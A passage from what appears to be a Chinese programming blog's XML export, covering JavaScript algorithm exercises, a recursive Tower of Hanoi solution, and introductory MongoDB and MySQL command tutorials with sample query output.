&#125;//打印结果66666......6..66666..66666..6...6..66666..66666..66666..66666..666666...6......6......6......6..6...6..6......6..........6..6...6..6...66...6......6..66666..66666..66666..66666..66666......6..66666..666666...6......6..6..........6......6......6..6...6......6..6...6......666666......6..66666..66666......6..66666..66666......6..66666..66666 百词斩： 找一个字符串中包含的最大数问题描述： 给出一个字符串，例如&#39;helloworld520helloworld1314&#39;，找出字符串中包含的最大数字，即输出为1314。 思路：利用正则表达式，先把字符串中的连续数字子串提取出来放到数组中，然后再求这个数字字符串数组中的最大数字。 注意：正则表达式的全局标志g一定要加上，不然只会找到第一个匹配。 123456789101112131415 function searchMaxNum(str) &#123; var reg = /([0-9]+)/g; //正则表达式，匹配字符串中的连续数字子串，并使用String的match方法将捕获组返回至numArr数组中 var numArr = string.match(reg); //numArr中的元素类型为字符串，即numAr为数字字符串数组 var maxNum = numArr[0] - 0; //将数字字符串转换为数值类型 for (var i = 0; i &lt; numArr.length; i ++) &#123; //找出numArr数字字符串数组中的最大值 var tempNum = numArr[i] - 0; if (tempNum &gt;= maxNum) &#123; maxNum = tempNum; &#125; &#125; console.log(maxNum);&#125;var string = 'helloworld520helloworld1314';searchMaxNum(string); //返回 1314 百词斩: 压缩连续数字1-7问题描述： 给出一个由数字1-7组成的有序数字字符串(分别代表星期一~星期天)，若这个数字字符串有三个或三个以上连续的数字，例如234，则返回其压缩形式2-4(由该段连续数字的首尾中间加一根短横线组成)，若连续的数字长度小于等于二，则将该数字直接返回就好，不用压缩。 例如给定输入 124567，则输出为1,2,4-7。 若给定输入12，则输出为1,2。 思路：(1)如果给定的字符串长度小于等于2，则直接在这段字符串中间加一个逗号 ,返回即可。 (2)若给定的字符串长度大于2，先将数字字符串转化为数字数组，再将该数组中连续的数字提取出来放到一个二维数组中，再将数组中字符串元素处理拼接。即判断该二维数组中元素的长度，若数组中元素的长度小于2，则直接加逗号拼接，若元素长度大于2，则写成压缩形式(用该元素的首尾再加短横线)拼接。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152function compressStr(str) &#123; var resultStr = ''; //压缩后的字符串，即输出结果 if (str.length &lt;= 2) &#123; //如果输入字符串长度&lt;=2，则直接中间加逗号返回 resultStr = str.split("").join(","); console.log(resultStr); &#125; else &#123; //输入字符串长度&gt;=3 // 先将数字字符串转化为数值类型并存进数组 var numArr = []; for (var i = 0; i &lt; str.length; i ++) &#123; numArr.push(str[i] - 0); &#125; // 将数组numArr中的连续数字提取出来放进一个二维数组 var twoDimArr = extractContinuity(numArr); // 处理二维数组twoDimArr for (var i = 0; i &lt; twoDimArr.length; i ++) &#123; var len = twoDimArr[i].length; //二维数组元素的长度 if (len &lt;= 2) &#123; resultStr = resultStr + twoDimArr[i].join(',') + ','; &#125; else &#123; resultStr = resultStr + twoDimArr[i][0] + '-' + twoDimArr[i][len-1] + ','; &#125; &#125; resultStr = resultStr.substring(0, resultStr.length - 1); //去掉最后多出的一个逗号 console.log(resultStr); &#125; &#125; // 判断一个数组的数字是否连续，将连续的数字提取出来转化为一个二维数组 // 例如[3, 4, 13 ,14, 15, 17, 20, 22] 转化为 [[3,4],[13,14,15],[17],[20],[22]] function extractContinuity(arr) &#123; var result = []; var temp; while (temp = arr.shift()) &#123; if (result.length === 0) &#123; //如果二维数组为空，则直接将arr的第一个数字push进该二维数组 result.push([temp]); continue; &#125; var element = result[result.length - 1]; //二维数组中的最后一个元素 if (temp === element[element.length - 1] + 1) &#123; element.push(temp); &#125; else &#123; result.push([temp]); &#125; &#125; return result; &#125; var string = '12367'; compressStr(string); //输出 '1-3,6,7' 百词斩： 给出一组数字的从小到大的全排列形式问题描述：给出一个数字数组，数组里的数字各不相同，例如[3, 1, 5],给出这几个数字的全排列并按从小到大的形式输出，即输出为 135,153,315,351,513,531。 思路：从数组的数字里面任意选一个，放在第一项,然后将剩下的数字递归全排。 123456789101112131415161718192021222324252627282930313233343536function fullSort(arr) &#123; var arr = arr.sort(); //先将数组排序 var result = []; if (arr.length === 1) &#123; result.push(arr); return result; &#125; for (var i = 0; i &lt; arr.length; i ++) &#123; var temp = []; temp.push(arr[i]); //取arr的任意一项放到temp的第一项 var remain = arr.slice(0); //深复制原数组到remain remain.splice(i, 1); //去掉temp中的那一项 var temp2 = fullSort(remain).concat(); //将剩下的项全排列，返回[[3,5],[5,3]]这样的数据 for (var j = 0; j &lt; temp2.length; j ++) &#123; temp2[j].unshift(temp[0]); //得到[[1,3,5],[1,5,3]]这样的数据 result.push(temp2[j]); &#125; &#125; return result;&#125;var arr = [3, 5, 1];var resultArr = fullSort(arr);for (var i = 0; i &lt; resultArr.length; i ++) &#123; var num = resultArr[i].join("") - 0; console.log(num);&#125;//输出结果135153315351513531]]></content>
      <categories>
        <category>js算法题</category>
      </categories>
      <tags>
        <tag>js算法题</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汉诺塔递归算法JS实现]]></title>
    <url>%2F2018%2F03%2F13%2F%E6%B1%89%E8%AF%BA%E5%A1%94%E9%80%92%E5%BD%92%E7%AE%97%E6%B3%95JS%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[递归把一组问题分解为一组相似的子问题，每一个问题都用一个寻常解去解决。递归函数就是会直接或者间接调用自身的一种函数，一般来说，一个递归函数调用自身去解决它的子问题。在自己这个函数里有调用自己这个函数的语句，而这个调用怎么才能调用结束呢？，这里还必须有一个结束点，或者具体的说是在调用到某一次后函数能返回一个确定的值，接着倒数第二个就能返回一个确定的值，一直到第一次调用的这个函数能返回一个确定的值。 “汉诺塔问题”描述塔上有三根柱子和一套直径各不相同的空心圆盘，开始时源柱子上的所有圆盘都按从大到小的顺序排列。目标是通过每一次移动一个圆盘到另一根柱子上，最终把一堆圆盘移动到目标柱子上，过程中不允许把较大的圆盘放置在较小的圆盘上； 当n=3时的移动如下： 把所有圆盘(n个)从A(src)移动到C(dst)。 (1) 当n=1时第一次：1号 A -&gt; C (2) 当n=2时第一次： 1号 A -&gt; B第二次: 2号 A -&gt; C第三次： 1号 B -&gt; C (3) 当n=3时第一次： 1号 A -&gt; C第二次： 2号 A -&gt; B第三次： 1号 C -&gt; B第四次： 3号 A -&gt; C第五次： 1号 B -&gt; A第六次： 2号 B -&gt; C第七次： 1号 A -&gt; C 可发现移动次数与n的关系为：2^n - 1 算法分析实现这个算法可以简单分为三个步骤：(1)把A上的 n-1 个圆盘借助辅助塔(C塔)由A移到B;(2)把 n号(即最大的那个)由A移到C；(3)把B上的 n-1 个圆盘借助辅助塔(A塔)由B移到C； javascript实现123456789101112131415161718// js语言精粹 4.8递归 汉诺塔问题var times = 0;function hanoi(n, src, aux, dist) &#123; if (n &gt; 0) &#123; hanoi(n - 1, src, dist, aux); //递归，把A(src)塔上编号1~n-1的圆盘移到B(aux)上，以C(dist)为辅助塔 console.log("第" + (++times) + "次移动：" + n + "号盘从" + src + "移到" + dist); //把A塔上编号为n的圆盘移到C上 hanoi(n - 1, aux, src, dist); //递归，把B塔上编号1~n-1的圆盘移到C上，以A为辅助塔 &#125;&#125;hanoi(3, 'A', 'B', 'C');//运行结果第1次移动：1号盘从A移到C第2次移动：2号盘从A移到B第3次移动：1号盘从C移到B第4次移动：3号盘从A移到C第5次移动：1号盘从B移到A第6次移动：2号盘从B移到C第7次移动：1号盘从A移到C 调用方法的栈机制从主线程开始调用方法（函数）进行不停的压栈和出栈操作，函数的调用就是将函数压如栈中，函数的结束就是函数出栈的过程，这样就保证了方法调用的顺序流，即当函数出现多层嵌套时，需要从外到内一层层把函数压入栈中，最后栈顶的函数先执行结束（最内层的函数先执行结束）后出栈，再倒数第二层的函数执行结束出栈，到最后，第一个进栈的函数调用结束后从栈中弹出回到主线程，并且结束。 图解程序运行流程(1)函数hanoi(n, A, B, C)的功能是把编号为n的圆盘借助B从A移到C上；(2)函数move(n, M, N)的功能是把编号为n的圆盘从M移到N上；]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB学习from菜鸟教程]]></title>
    <url>%2F2018%2F03%2F12%2FMongoDB%E5%AD%A6%E4%B9%A0from%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[在学习《一起学 Node.js》中，需要使用 Express + MongoDB 搭建多人博客，因此在菜鸟MongoDB 教程上学习总结MongoDB的基本用法。MongoDB是一个基于分布式文件存储的开源数据库系统。 在高负载的情况下，添加更多的节点，可以保证服务器性能, 为WEB应用提供可扩展的高性能数据存储解决方案。MongoDB 将数据存储为一个文档，数据结构由键值(key=&gt;value)对组成。 MongoDB 文档类似于 JSON 对象。 字段值可以包含其他文档，数组及文档数组。mongodb中基本的概念是文档、集合、数据库。一个mongodb中可以建立多个数据库。MongoDB的默认数据库为”db”，该数据库存储在data目录中。 MongoDB的单个实例可以容纳多个独立的数据库，每一个都有自己的集合和权限，不同的数据库也放置在不同的文件中。 基本用法先cd到bin文件夹下，执行”mongo”启动客户端。(1)show dbs 命令可以显示所有数据的列表。 &gt; show dbs admin 0.000GB config 0.000GB local 0.000GB (2)db 命令可以显示当前数据库对象或集合。 &gt; db test (3)use database_name命令，可以连接到一个指定的数据库。 &gt; use local switched to db local &gt; db local (4)数据库名命名规则：可以是满足以下条件的任意UTF-8字符串。 不能是空字符串（&quot;&quot;)。 不得含有&apos; &apos;（空格)、.、$、/、\和\0 (空字符)。 应全部小写。 最多64字节 有一些数据库名是保留的，可以直接访问这些有特殊作用的数据库。 admin： 从权限的角度来看，这是&quot;root&quot;数据库。要是将一个用户添加到这个数据库，这个用户自动继承所有数据库的权限。一些特定的服务器端命令也只能从这个数据库运行，比如列出所有的数据库或者关闭服务器。 local: 这个数据永远不会被复制，可以用来存储限于本地单台服务器的任意集合 config: 当Mongo用于分片设置时，config数据库在内部使用，用于保存分片的相关信息。 (5)文档文档是一组键值(key-value)对(即BSON)。MongoDB 的文档不需要设置相同的字段，并且相同的字段不需要相同的数据类型，这与关系型数据库有很大的区别，也是 MongoDB 非常突出的特点。一个简单的文档如下所示： {&quot;site&quot;:&quot;www.runoob.com&quot;, &quot;name&quot;:&quot;菜鸟教程&quot;} 文档中的键/值对是有序的。 文档中的值不仅可以是在双引号里面的字符串，还可以是其他几种数据类型（甚至可以是整个嵌入的文档)。 MongoDB区分类型和大小写。 MongoDB的文档不能有重复的键。 文档的键是字符串。除了少数例外情况，键可以使用任意UTF-8字符。 文档键命名规范： 键不能含有\0 (空字符)。这个字符用来表示键的结尾。 .和$有特别的意义，只有在特定环境下才能使用。 以下划线&quot;_&quot;开头的键是保留的(不是严格要求的)。 (6)集合集合就是 MongoDB 文档组，类似于 RDBMS （关系数据库管理系统：Relational Database Management System)中的表格。集合存在于数据库中，集合没有固定的结构，这意味着你在对集合可以插入不同格式和类型的数据，但通常情况下我们插入集合的数据都会有一定的关联性。可以将以下不同数据结构的文档插入到集合中： {&quot;site&quot;:&quot;www.baidu.com&quot;} {&quot;site&quot;:&quot;www.google.com&quot;,&quot;name&quot;:&quot;Google&quot;} {&quot;site&quot;:&quot;www.runoob.com&quot;,&quot;name&quot;:&quot;菜鸟教程&quot;,&quot;num&quot;:5} 集合名命名规范： 集合名不能是空字符串&quot;&quot;。 集合名不能含有\0字符（空字符)，这个字符表示集合名的结尾。 集合名不能以&quot;system.&quot;开头，这是为系统集合保留的前缀。 用户创建的集合名字不能含有保留字符。有些驱动程序的确支持在集合名里面包含，这是因为某些系统生成的集合中包含该字符。除非你要访问这种系统创建的集合，否则千万不要在名字里出现$。 Capped collections 就是固定大小的collection。(7)元数据数据库的信息是存储在集合中。它们使用了系统的命名空间：dbname.system.* 创建数据库use DATABASE_NAME 如果数据库不存在，则创建数据库，否则切换到指定数据库。 &gt; use test switched to db test &gt; db test &gt; show dbs admin 0.000GB config 0.000GB local 0.000GB 刚创建的test数据库不在数据库列表中，要显示它，必须插入一些数据。 &gt; db.test.insert({&quot;name&quot;:&quot;hello&quot;}) WriteResult({ &quot;nInserted&quot; : 1 }) &gt; show dbs admin 0.000GB config 0.000GB local 0.000GB test 0.000GB MongoDB 中默认的数据库为 test，如果你没有创建新的数据库，集合将存放在 test 数据库中。 删除数据库先切换到要删除的数据库，再执行db.dropDatabase() &gt; use test switched to db test &gt; db test &gt; db.dropDatabase() { &quot;dropped&quot; : &quot;test&quot;, &quot;ok&quot; : 1 } &gt; show dbs admin 0.000GB config 0.000GB local 0.000GB 关于MongoDB更详细的操作命令见菜鸟教程。]]></content>
      <categories>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL数据库的安装及基本的使用方法]]></title>
    <url>%2F2018%2F03%2F09%2FMySQL-install-and-usage%2F</url>
    <content type="text"><![CDATA[关于MySQL数据库基本的安装和操作方法。MySQL教程–菜鸟。 安装安装步骤可参考博客mysql数据库下载、安装、使用前部分，我选择安装的是MySQL Server组件，其他基本照着默认方式就好了。 基本的使用方法参考博客 MySql基本使用方法 。 1．显示当前数据库服务器中的数据库列表mysql&gt; SHOW DATABASES; mysql&gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | +--------------------+ 2.显示某个数据库中的数据mysql&gt; USE 库名；//使用某个库 mysql&gt; SHOW TABLES；//列出库中所有的表 3.显示数据表的结构mysql&gt; DESCRIBE 表名； 4.建立数据库 mysql&gt; CREATE DATABASE 库名； 例如新建一个名为test的数据库，再查看下数据库列表，多了个新的test数据库 mysql&gt; CREATE DATABASE test; Query OK, 1 row affected (0.01 sec) mysql&gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | | test | +--------------------+ 5.建立数据表mysql&gt; USE 库名; mysql&gt; CREATE TABLE 表名 (字段名 VARCHAR(20), 字段名 CHAR(1))； //CREATE TABLE table_name (column_name column_type); 新建一个名为Websites的数据表，字段值分别为id, name, url, alexa, country。关于MySQL建表字段的类型参考博客MySQL建表字段类型。 mysql&gt; CREATE TABLE Websites(id int,name varchar(18),url varchar(100),alexa int,country varchar(18)); Query OK, 0 rows affected (0.04 sec) 6.删除数据库 mysql&gt; DROP DATABASE 库名； 7.删除数据表mysql&gt; DROP TABLE 表名; 8.将表中记录清空 mysql&gt; DELETE FROM 表名; 9.显示表中的所有记录 mysql&gt; SELECT * FROM 表名; 10.往表中插入记录 mysql&gt; INSERT INTO 表名 VALUES (&quot;hyq&quot;,&quot;M&quot;);往名为Websites的表中插入第一条记录，各字段值分别为：id=1,name=&quot;Google&quot;,url=&quot;https://www.google.com/&quot;, alexa=1,country=&quot;USA&quot;。然后查看添加记录后表中的记录显示如下所示： mysql&gt; INSERT INTO Websites VALUES (1,&quot;Google&quot;,&quot;https://www.google.com/&quot;,1,&quot;USA&quot;); Query OK, 1 row affected (0.02 sec) mysql&gt; SELECT * FROM Websites; +------+--------+-------------------------+-------+---------+ | id | name | url | alexa | country | +------+--------+-------------------------+-------+---------+ | 1 | Google | https://www.google.com/ | 1 | USA | +------+--------+-------------------------+-------+---------+ 添加完菜鸟教程中SQL示例代码数据表中的5条示例记录后，Websites数据表显示如下： mysql&gt; SELECT * FROM Websites; +------+--------------+--------------------------+-------+---------+ | id | name | url | alexa | country | +------+--------------+--------------------------+-------+---------+ | 1 | Google | https://www.google.com/ | 1 | USA | | 2 | 淘宝 | https://www.taobao.com/ | 13 | CN | | 3 | 菜鸟教程 | http://www.runoob.com | 4689 | CN | | 4 | 微博 | http://weibo.com | 20 | CN | | 5 | Facebook | http://www.facebook.com/ | 3 | USA | +------+--------------+--------------------------+-------+---------+ 11.更新表中数据 mysql-&gt; UPDATE 表名 SET 字段名1=&#39;a&#39;,字段名2=&#39;b&#39; WHERE 字段名3=&#39;c&#39;； 12.用文本方式将数据装入数据表中 mysql&gt; LOAD DATA LOCAL INFILE &quot;D:/mysql.txt&quot; INTO TABLE 表名; ###13.导入.sql文件命令 ### mysql&gt; USE 数据库名; mysql&gt; SOURCE d:/mysql.sql; 14.显示正在use的数据库名 mysql&gt; SELECT DATABASE();如下所示，在新建的test数据库中建立的Websites数据表，因此正在使用的数据库是test。 mysql&gt; SELECT DATABASE(); +------------+ | DATABASE() | +------------+ | test | +------------+ 15.显示当前的user mysql&gt; SELECT USER(); mysql&gt; SELECT USER(); +----------------+ | USER() | +----------------+ | root@localhost | +----------------+ 16.SELECT TOP 子句返回规定的记录数目。MySQL语法如下： SELECT column_name(s) FROM table_name LIMIT number; 从 “Websites” 表中选取头两条记录如下： mysql&gt; SELECT * FROM Websites -&gt; LIMIT 2; +------+--------+-------------------------+-------+---------+ | id | name | url | alexa | country | +------+--------+-------------------------+-------+---------+ | 1 | Google | https://www.google.com/ | 1 | USA | | 2 | 淘宝 | https://www.taobao.com/ | 13 | CN | +------+--------+-------------------------+-------+---------+ 17.LIKE 操作符LIKE 操作符用于在 WHERE 子句中搜索列中的指定模式。语法如下： SELECT column_name(s) FROM table_name WHERE column_name LIKE pattern; 以下示例选取 name 以字母 “G” 开始的所有记录： mysql&gt; SELECT * FROM Websites -&gt; WHERE name LIKE &quot;G%&quot;; +------+--------+-------------------------+-------+---------+ | id | name | url | alexa | country | +------+--------+-------------------------+-------+---------+ | 1 | Google | https://www.google.com/ | 1 | USA | 以下示例选取 name 以字母 “k” 结尾的所有客户： mysql&gt; SELECT * FROM Websites -&gt; WHERE name LIKE &quot;%k&quot;; +------+----------+--------------------------+-------+---------+ | id | name | url | alexa | country | +------+----------+--------------------------+-------+---------+ | 5 | Facebook | http://www.facebook.com/ | 3 | USA | +------+----------+--------------------------+-------+---------+ 以下示例选取 name 包含模式 “oo” 的所有记录： mysql&gt; SELECT * FROM Websites -&gt; WHERE name LIKE &quot;%oo%&quot;; +------+----------+--------------------------+-------+---------+ | id | name | url | alexa | country | +------+----------+--------------------------+-------+---------+ | 1 | Google | https://www.google.com/ | 1 | USA | | 5 | Facebook | http://www.facebook.com/ | 3 | USA | +------+----------+--------------------------+-------+---------+ 注意：”%” 符号用于在模式的前后定义通配符（缺省字母），通配符可用于替代字符串中的任何其他字符。 通配符与 SQL LIKE 操作符一起使用。 % 替代 0 个或多个字符 _ 替代一个字符 [charlist] 字符列中的任何单一字符 [^charlist]或[!charlist] 不在字符列中的任何单一字符 搭配以上通配符可以让LIKE命令实现多种技巧： 1、LIKE&apos;Mc%&apos; 将搜索以字母 Mc 开头的所有字符串（如 McBadden）。 2、LIKE&apos;%inger&apos; 将搜索以字母 inger 结尾的所有字符串（如 Ringer、Stringer）。 3、LIKE&apos;%en%&apos; 将搜索在任何位置包含字母 en 的所有字符串（如 Bennet、Green、McBadden）。 4、LIKE&apos;_heryl&apos; 将搜索以字母 heryl 结尾的所有六个字母的名称（如 Cheryl、Sheryl）。 5、LIKE&apos;[CK]ars[eo]n&apos; 将搜索下列字符串：Carsen、Karsen、Carson 和 Karson（如 Carson）。 6、LIKE&apos;[M-Z]inger&apos; 将搜索以字符串 inger 结尾、以从 M 到 Z 的任何单个字母开头的所有名称（如 Ringer）。 7、LIKE&apos;M[^c]%&apos; 将搜索以字母 M 开头，并且第二个字母不是 c 的所有名称（如MacFeather）。 18.[charlist] 通配符MySQL 中使用 REGEXP 或 NOT REGEXP 运算符 (或 RLIKE 和 NOT RLIKE) 来操作正则表达式。下面的 SQL 语句选取 name 以 “G”、”F” 或 “s” 开始的所有网站： mysql&gt; SELECT * FROM Websites -&gt; WHERE name REGEXP &quot;^[GFs]&quot;; +------+---------------+----------------------------+-------+---------+ | id | name | url | alexa | country | +------+---------------+----------------------------+-------+---------+ | 1 | Google | https://www.google.com/ | 1 | USA | | 5 | Facebook | http://www.facebook.com/ | 3 | USA | | 6 | stackoverflow | https://stackoverflow.com/ | 0 | IND | +------+---------------+----------------------------+-------+---------+ 19.IN 操作符IN 操作符允许在 WHERE 子句中规定多个值，然后返回规定相应的记录。语法如下： SELECT column_name(s) FROM table_name WHERE column_name IN (value1,value2,...); 以下语句选取 name 为 “Google” 或 “菜鸟教程” 的所有记录： mysql&gt; SELECT * FROM Websites -&gt; WHERE name IN (&quot;Google&quot;,&quot;菜鸟教程&quot;); +------+--------------+-------------------------+-------+---------+ | id | name | url | alexa | country | +------+--------------+-------------------------+-------+---------+ | 1 | Google | https://www.google.com/ | 1 | USA | | 3 | 菜鸟教程 | http://www.runoob.com | 4689 | CN | +------+--------------+-------------------------+-------+---------+ IN 与 = 的异同： 相同点：均在WHERE中使用作为筛选条件之一、均是等于的含义 不同点：IN可以规定多个值，等于规定一个值 20.BETWEEN 操作符用于选取介于两个值之间的数据范围内的值。这些值可以是数值、文本或者日期。 语法如下： SELECT column_name(s) FROM table_name WHERE column_name BETWEEN value1 AND value2; 以下语句选取 alexa 介于 1 和 20 之间的所有记录： mysql&gt; SELECT * FROM Websites -&gt; WHERE alexa BETWEEN 1 AND 20; +------+----------+--------------------------+-------+---------+ | id | name | url | alexa | country | +------+----------+--------------------------+-------+---------+ | 1 | Google | https://www.google.com/ | 1 | USA | | 2 | 淘宝 | https://www.taobao.com/ | 13 | CN | | 4 | 微博 | http://weibo.com | 20 | CN | | 5 | Facebook | http://www.facebook.com/ | 3 | USA | +------+----------+--------------------------+-------+---------+ NOT BETWEEN 显示不在范围内的所有记录。以下语句语句选取alexa介于 1 和 20 之间但 country 不为 USA 和 IND 的所有记录： mysql&gt; SELECT * FROM Websites -&gt; WHERE alexa BETWEEN 1 AND 20 -&gt; AND NOT country IN (&quot;USA&quot;,&quot;IND&quot;); +------+--------+-------------------------+-------+---------+ | id | name | url | alexa | country | +------+--------+-------------------------+-------+---------+ | 2 | 淘宝 | https://www.taobao.com/ | 13 | CN | | 4 | 微博 | http://weibo.com | 20 | CN | +------+--------+-------------------------+-------+---------+ 21.连接(JOIN)参考SQL 连接(JOIN)。用于把来自两个或多个表的行结合起来。基于这些表之间的共同字段。最常见的 JOIN 类型：SQL INNER JOIN（简单的 JOIN）。SQL INNER JOIN 从多个表中返回满足 JOIN 条件的所有行。“Websites” 表中的 “id” 列指向 “access_log“ 表中的字段 “site_id“。将这两个表是通过 “site_id“ 列联系起来的。 mysql&gt; SELECT Websites.id, Websites.name, access_log.count, access_log.date -&gt; FROM Websites -&gt; INNER JOIN access_log -&gt; ON Websites.id=access_log.site_id; +------+--------------+-------+------------+ | id | name | count | date | +------+--------------+-------+------------+ | 1 | Google | 45 | 2016-05-10 | | 3 | 菜鸟教程 | 100 | 2016-05-13 | | 1 | Google | 230 | 2016-05-14 | | 2 | 淘宝 | 10 | 2016-05-14 | | 5 | Facebook | 205 | 2016-05-14 | | 4 | 微博 | 13 | 2016-05-15 | | 3 | 菜鸟教程 | 220 | 2016-05-15 | | 5 | Facebook | 545 | 2016-05-16 | | 3 | 菜鸟教程 | 201 | 2016-05-17 | +------+--------------+-------+------------+ 不同的 SQL JOIN： INNER JOIN：如果表中有至少一个匹配，则返回行 LEFT JOIN：即使右表中没有匹配，也从左表返回所有的行 RIGHT JOIN：即使左表中没有匹配，也从右表返回所有的行 FULL JOIN：只要其中一个表中存在匹配，则返回行 首先，连接的结果可以在逻辑上看作是由SELECT语句指定的列组成的新表。左连接与右连接的左右指的是以两张表中的哪一张为基准，它们都是外连接。外连接就好像是为非基准表添加了一行全为空值的万能行，用来与基准表中找不到匹配的行进行匹配。假设两个没有空值的表进行左连接，左表是基准表，左表的所有行都出现在结果中，右表则可能因为无法与基准表匹配而出现是空值的字段。 22.INNER JOIN在表中存在至少一个匹配时返回行。语法如下： SELECT column_name(s) FROM table1 INNER JOIN table2 ON table1.column_name=table2.column_name; 或： SELECT column_name(s) FROM table1 JOIN table2 ON table1.column_name=table2.column_name; 具体例子如21所示。注释：INNER JOIN 与 JOIN 是相同的注释：INNER JOIN 关键字在表中存在至少一个匹配时返回行。如果 “Websites” 表中的行在 “access_log“ 中没有匹配，则不会列出这些行。 23.LEFT JOIN从左表（table1）返回所有的行，即使右表（table2）中没有匹配。如果右表中没有匹配，则结果为 NULL。语法如下： SELECT column_name(s) FROM table1 LEFT JOIN table2 ON table1.column_name=table2.column_name; 或： SELECT column_name(s) FROM table1 LEFT OUTER JOIN table2 ON table1.column_name=table2.column_name; // 在某些数据库中，LEFT JOIN 称为 LEFT OUTER JOIN。 以下示例语句将返回所有网站及他们的访问量（如果有的话）。把 Websites 作为左表，access_log 作为右表： mysql&gt; SELECT Websites.id, Websites.name, access_log.count, access_log.date -&gt; FROM Websites -&gt; LEFT JOIN access_log -&gt; ON Websites.id=access_log.site_id -&gt; ORDER BY access_log.count DESC; +------+---------------+-------+------------+ | id | name | count | date | +------+---------------+-------+------------+ | 5 | Facebook | 545 | 2016-05-16 | | 1 | Google | 230 | 2016-05-14 | | 3 | 菜鸟教程 | 220 | 2016-05-15 | | 5 | Facebook | 205 | 2016-05-14 | | 3 | 菜鸟教程 | 201 | 2016-05-17 | | 3 | 菜鸟教程 | 100 | 2016-05-13 | | 1 | Google | 45 | 2016-05-10 | | 4 | 微博 | 13 | 2016-05-15 | | 2 | 淘宝 | 10 | 2016-05-14 | | 6 | stackoverflow | NULL | NULL | +------+---------------+-------+------------+ 24.FULL OUTER JOINFULL OUTER JOIN 关键字只要左表（table1）和右表（table2）其中一个表中存在匹配，则返回行。FULL OUTER JOIN 关键字结合了 LEFT JOIN 和 RIGHT JOIN 的结果。FULL OUTER JOIN 关键字返回左表（Websites）和右表（access_log）中所有的行。如果 “Websites” 表中的行在 “access_log“ 中没有匹配或者 “access_log“ 表中的行在 “Websites” 表中没有匹配，也会列出这些行。语法如下： SELECT column_name(s) FROM table1 FULL OUTER JOIN table2 ON table1.column_name=table2.column_name; 注意： MySQL中不支持 FULL OUTER JOIN，可以在 SQL Server 测试实例。 25.UNION用于合并两个或多个 SELECT 语句的结果。注意： UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。语法如下： SELECT column_name(s) FROM table1 UNION SELECT column_name(s) FROM table2;注释：(1) 默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。(2) UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。 mysql&gt; SELECT country FROM Websites -&gt; UNION -&gt; SELECT country FROM apps -&gt; ORDER BY country; +---------+ | country | +---------+ | CN | | IND | | USA | +---------+ 注释：UNION 不能用于列出两个表中所有的country。如果一些网站和APP来自同一个国家，每个国家只会列出一次。UNION 只会选取不同的值。请使用 UNION ALL 来选取重复的值！使用UNION命令时需要注意，只能在最后使用一个ORDER BY命令，是将两个查询结果合在一起之后，再进行排序！绝对不能写两个ORDER BY命令。 26.INSERT INTO SELECT / SELECT INTO从一个表复制信息插入到另一个已存在的表，目标表中任何已存在的行都不会受影响。。注意：MySQL 数据库不支持 SELECT … INTO 语句，但支持 INSERT INTO … SELECT 。以使用以下语句来拷贝表结构及数据：CREATE TABLE 新表 SELECT * FROM 旧表;语法如下： INSERT INTO table2 SELECT * FROM table1; 或者只复制希望的列插入到另一个已存在的表中： INSERT INTO table2 (column_name(s)) SELECT column_name(s) FROM table1; 以下语句复制 “apps” 中的数据插入到 “Websites” 中： mysql&gt; INSERT INTO Websites(name,country) -&gt; SELECT app_name,country FROM apps -&gt; WHERE id=1; Query OK, 1 row affected (0.01 sec) mysql&gt; SELECT * FROM Websites; +------+---------------+----------------------------+-------+---------+ | id | name | url | alexa | country | +------+---------------+----------------------------+-------+---------+ | 1 | Google | https://www.google.com/ | 1 | USA | | 2 | 淘宝 | https://www.taobao.com/ | 13 | CN | | 3 | 菜鸟教程 | http://www.runoob.com | 4689 | CN | | 4 | 微博 | http://weibo.com | 20 | CN | | 5 | Facebook | http://www.facebook.com/ | 3 | USA | | 6 | stackoverflow | https://stackoverflow.com/ | 0 | IND | | NULL | QQ APP | NULL | NULL | CN | +------+---------------+----------------------------+-------+---------+ 表apps中的数据如下： mysql&gt; SELECT * FROM apps; +------+------------+------------------------+---------+ | id | app_name | url | country | +------+------------+------------------------+---------+ | 1 | QQ APP | http://im.qq.com/ | CN | | 2 | 微博 APP | http://weibo.com/ | CN | | 3 | 淘宝 APP | http://www.taobao.com/ | CN | +------+------------+------------------------+---------+ 27.约束（Constraints）SQL 约束用于规定表中的数据规则。如果存在违反约束的数据行为，行为会被约束终止。约束可以在创建表时规定（通过 CREATE TABLE 语句），或者在表创建之后规定（通过 ALTER TABLE 语句）。语法如下： CREATE TABLE table_name ( column_name1 data_type(size) constraint_name, column_name2 data_type(size) constraint_name, column_name3 data_type(size) constraint_name, .... ); 在 SQL 中，有如下约束： NOT NULL - 指示某列不能存储 NULL 值。 UNIQUE - 保证某列的每行必须有唯一的值。 PRIMARY KEY - NOT NULL 和 UNIQUE 的结合。确保某列（或两个列多个列的结合）有唯一标识，有助于更容易更快速地找到表中的一个特定的记录。 FOREIGN KEY - 保证一个表中的数据匹配另一个表中的值的参照完整性。 CHECK - 保证列中的值符合指定的条件。 DEFAULT - 规定没有给列赋值时的默认值。 (1) NOT NULL 约束强制列不接受 NULL 值, 强制字段始终包含值。这意味着，如果不向字段添加值，就无法插入新记录或者更新记录。(2) UNIQUE 约束唯一标识数据库表中的每条记录。UNIQUE 和 PRIMARY KEY 约束均为列或列集合提供了唯一性的保证。PRIMARY KEY 约束拥有自动定义的 UNIQUE 约束。注意，每个表可以有多个 UNIQUE 约束，但是每个表只能有一个 PRIMARY KEY 约束。下面的 SQL 在 “Persons” 表创建时在 “P_Id“ 列上创建 UNIQUE 约束： CREATE TABLE Persons ( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), UNIQUE 